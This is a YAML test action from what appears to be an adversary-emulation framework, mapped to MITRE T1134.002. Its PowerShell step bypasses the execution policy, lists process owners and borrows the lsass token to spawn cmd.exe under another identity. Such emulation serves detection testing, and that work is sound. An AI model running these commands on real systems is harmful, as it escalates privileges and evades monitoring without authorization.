api_version: "2.0"
name: Access Token Manipulation
description: "This Action demonstrates how an access token for a specific program can spawn another program under a different owner. \nAdversaries can leverage access tokens to run programs under a different user not only to achieve privilege escalation but also to evade detection by blending in with normal user activity. \nThis Action will query all processes and list the process name and owner.It will then make a copy of an existing token to create a new instance of cmd.exe\n"
uuid: dbf4f5a9-b8e0-46a3-9841-9ad71247239e
mitre:
    tactics:
        - 'TA0005: Defense Evasion'
        - 'TA0004: Privilege Escalation'
    techniques:
        - 'T1134: Access Token Manipulation'
    subtechniques:
        - 'T1134.002: Create Process with Token'
requirements:
    platforms:
        - os: windows
steps:
    - name: access-token-manipulation
      inline: |
        Set-ExecutionPolicy -Scope Process Bypass -Force
        $owners = @{}
        gwmi win32_process |% {$owners[$_.handle] = $_.getowner().user}
        Get-Process | Select ProcessName,Id,@{l="Owner";e={$owners[$_.id.tostring()]}}
        & "$PathToAtomicsFolder\T1134.002\src\GetToken.ps1"; [MyProcess]::CreateProcessFromParent((Get-Process lsass).Id,"cmd.exe")
      executor: powershell
      cleanup:
        inline: ""
        executor: powershell
